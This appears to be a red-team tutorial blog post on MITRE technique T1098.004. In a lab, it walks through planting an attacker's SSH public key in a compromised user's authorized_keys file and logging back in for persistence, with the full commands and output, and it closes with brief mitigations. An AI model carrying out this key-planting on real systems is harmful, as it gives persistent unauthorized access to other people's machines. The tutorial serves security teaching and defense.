---
title: SSH Authorized Keys
date: 2022-04-08 07:49:33 +0800
categories: [Red Teaming, Persistence]
tags: []  
---

# MITRE
- ID : `T1098.004`
- Tactic : `Persistence`
- Platforms: `IaaS`, `Linux`, `macOS`

# SSH Authorized Keys
***SSH Authorized Keys*** specifies the SSH keys that can be used for logging into the user account for which the file is configured.  This file is usually found in the user's home directory under ~/.ssh/authorized_keys. Adversaries may modify SSH authorized_keys files directly with scripts or shell commands to add their own adversary-supplied public keys, which will provide them with a persistent access to the compromised system.

## Steps

- Gain access to the target system.
- Generate your ssh-key pair(public and private keys using ssh-keygen).
- Insert your generated ssh public key(.pub) in the authorized_keys file of the target system(~/.ssh/authorized_keys).
- Login to the system with your generated ssh private key

### Gain access to the target system.

***shell on target system***
```bash
user1@user1-VirtualBox:~$ whoami
user1
user1@user1-VirtualBox:~$ pwd
/home/user1
user1@user1-VirtualBox:~$ cd .ssh
user1@user1-VirtualBox:~/.ssh$ ls
authorized_keys  known_hosts
user1@user1-VirtualBox:~/.ssh$ 
```

### Generate your ssh-key pair(public and private keys using ssh-keygen)

***Generating ssh keys with ssh-keygen***
```bash
┌──(cyberkhalid㉿kali)-[~/pentest/data]
└─$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/cyberkhalid/.ssh/id_rsa): /home/cyberkhalid/pentest/data/persist
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/cyberkhalid/pentest/data/persist
Your public key has been saved in /home/cyberkhalid/pentest/data/persist.pub
The key fingerprint is:
SHA256:Co9FQudtbnGl9sPCILHbe7LMp+ygwP6FTIE1weM+qxs cyberkhalid@kali
The key's randomart image is:
+---[RSA 3072]----+
|   .=.o     .    |
|   +o+ +   o     |
|  ..o.= = +      |
|    .+ * * o     |
|   .o o S o +    |
| . oo* o . . .   |
|  E +o= o .      |
| . o.o = +.      |
|  ++o  .Bo       |
+----[SHA256]-----+

┌──(cyberkhalid㉿kali)-[~/pentest/data]
└─$ ls
persist  persist.pub
```
### Insert your generated ssh public key(.pub) in the authorized_keys file

***Copying pubic key(.pub) file***
```bash
┌──(cyberkhalid㉿kali)-[~/pentest/data]
└─$ ls
persist  persist.pub

┌──(cyberkhalid㉿kali)-[~/pentest/data]
└─$ cat persist.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXHulTi79pBVYleeDwhLo3HQNsiTMCUKUAdBU9pa/P73Qr87MEMAWONq96RCEbyZHl8vHsgxQbsx0pIu1G8gCUFetg/Nce5UrAwcNst6mDjJpgLYz2TToEDS0cVTS+8loD604A4vv6WQnxOGRpBHwyxnoKzSB2eQ3dKm4QmCBnpzIHp9iOe3rN7/TZ8oU/VJWB/EqPUpjJdRFBYY7rgswoP5v6ilMqui2O1bRBSsV5qkk5aW9rPBExeLqDX7TMxRn6AQogk8sMYIOITlPQEsmSMs7vmfX1nR11eAVAFUfA/bll+LHQ5QOWbq4TxrtXNYEIs8LPMXTBFo+ZDVyztD9hkgMfSVHYAzcTqafeDxV5m6JQFPzCICykLPOlTUFIlHjX0TJlg85anrh1u14bmCO+h3GZI4cwQL9CexKr3fGtzj4qyOfzbZ5srYmMNlVNVUlNW4bBod0zFLJ7t2+Tk6tjDLU3XZlIANkFPWs/g3/HUycFlqFLmNatlVEkH5rCJCE= cyberkhalid@kali
```
***Inserting public key in authorized_keys file***
```bash
user1@user1-VirtualBox:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXHulTi79pBVYleeDwhLo3HQNsiTMCUKUAdBU9pa/P73Qr87MEMAWONq96RCEbyZHl8vHsgxQbsx0pIu1G8gCUFetg/Nce5UrAwcNst6mDjJpgLYz2TToEDS0cVTS+8loD604A4vv6WQnxOGRpBHwyxnoKzSB2eQ3dKm4QmCBnpzIHp9iOe3rN7/TZ8oU/VJWB/EqPUpjJdRFBYY7rgswoP5v6ilMqui2O1bRBSsV5qkk5aW9rPBExeLqDX7TMxRn6AQogk8sMYIOITlPQEsmSMs7vmfX1nR11eAVAFUfA/bll+LHQ5QOWbq4TxrtXNYEIs8LPMXTBFo+ZDVyztD9hkgMfSVHYAzcTqafeDxV5m6JQFPzCICykLPOlTUFIlHjX0TJlg85anrh1u14bmCO+h3GZI4cwQL9CexKr3fGtzj4qyOfzbZ5srYmMNlVNVUlNW4bBod0zFLJ7t2+Tk6tjDLU3XZlIANkFPWs/g3/HUycFlqFLmNatlVEkH5rCJCE= cyberkhalid@kali" >> authorized_keys
user1@user1-VirtualBox:~/.ssh$ 
```
### Login to the system 
*Note: Make sure you change the permission of the private key to 400.(chmod 400 privatekeyfile).*

***login using the generated private key***
```bash
┌──(cyberkhalid㉿kali)-[~/pentest/data]
└─$ ls
persist  persist.pub

┌──(cyberkhalid㉿kali)-[~/pentest/data]
└─$ chmod 400 persist

┌──(cyberkhalid㉿kali)-[~/pentest/data]
└─$ ssh -i persist user1@10.42.0.21
Enter passphrase for key 'persist': 
Last login: Tue Jun  7 00:30:09 2022 from 10.42.0.1
user1@user1-VirtualBox:~$ whoami
user1
user1@user1-VirtualBox:~$ 
```
# Mitigations

- Disable SSH if it is not necessary on a host or restrict SSH access for specific users/groups using /etc/ssh/sshd_config.
- Restrict access to the authorized_keys file.

# References

- [https://attack.mitre.org/techniques/T1098/004/](https://attack.mitre.org/techniques/T1098/004/)
- [https://attack.mitre.org/techniques/T1098/004/](https://attack.mitre.org/techniques/T1098/004/)
- [https://attack.mitre.org/tactics/TA0003/](https://attack.mitre.org/tactics/TA0003/)
- [https://www.ssh.com/academy/ssh/authorized-keys-file](https://www.ssh.com/academy/ssh/authorized-keys-file)
- [https://attack.mitre.org/techniques/T1098/004/](https://attack.mitre.org/techniques/T1098/004/)

